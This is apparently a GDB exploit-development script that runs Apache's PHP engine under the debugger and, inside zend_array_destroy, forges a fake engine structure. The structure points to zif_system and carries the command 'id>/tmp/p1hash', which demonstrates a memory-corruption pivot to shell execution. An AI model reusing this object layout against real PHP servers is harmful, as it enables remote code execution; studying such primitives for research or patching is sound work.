set pagination off
set confirm off
set breakpoint pending on
set logging file /tmp/p1d.log
set logging overwrite on
set logging enabled on
file /usr/sbin/apache2
set args -X
set $done = 0
break zend_mm_safe_error
commands
silent
printf "OOM\n"
bt 6
continue
end
break zend_array_destroy
commands
silent
set $ht = (char *)$rdi
set $nu = *(unsigned int *)($ht + 24)
if $nu == 1 && $done == 0
set $done = 1
set $ad = *(char **)($ht + 16)
set $blk = $ad - 0x40
printf "PIVOT ht=%p ad=%p blk=%p zif=%p\n", $ht, $ad, $blk, &zif_system
set {long}($blk+0x00) = 0x0000000700000001
set {int}($blk+0x08) = 0x10
set {int}($blk+0x0C) = 0xfffffff8
set {long}($blk+0x10) = (long)($blk + 0x60)
set {int}($blk+0x18) = 1
set {int}($blk+0x1C) = 1
set {int}($blk+0x20) = 1
set {int}($blk+0x24) = 0
set {long}($blk+0x28) = 0
set {long}($blk+0x30) = (long)&zif_system
set {long}($blk+0x40) = (long)$blk
set {int}($blk+0x48) = 0x307
set {long}($blk+0x50) = 0
set {long}($blk+0x58) = 0
set {long}($blk+0x60) = 0
set {long}($blk+0x68) = 0
set {long}($blk+0x70) = 0
set {long}($blk+0x78) = 0
set {long}($blk+0x80) = 0
set {int}($blk+0x88) = 0
set {int}($blk+0x8C) = 1
set {long}($blk+0x90) = 0
set {long}($blk+0x98) = 0
set {int}($blk+0xA0) = 0
set {long}($blk+0xB0) = (long)($blk + 0xC0)
set {int}($blk+0xB8) = 6
set {long}($blk+0xC0) = 0x0000010600000001
set {long}($blk+0xC8) = 0
set {long}($blk+0xD0) = 14
set {char[15]}($blk+0xD8) = "id>/tmp/p1hash"
printf "PIVOT-BYTES\n"
x/6gx $blk
x/6gx $ad
end
continue
end
run
bt 8
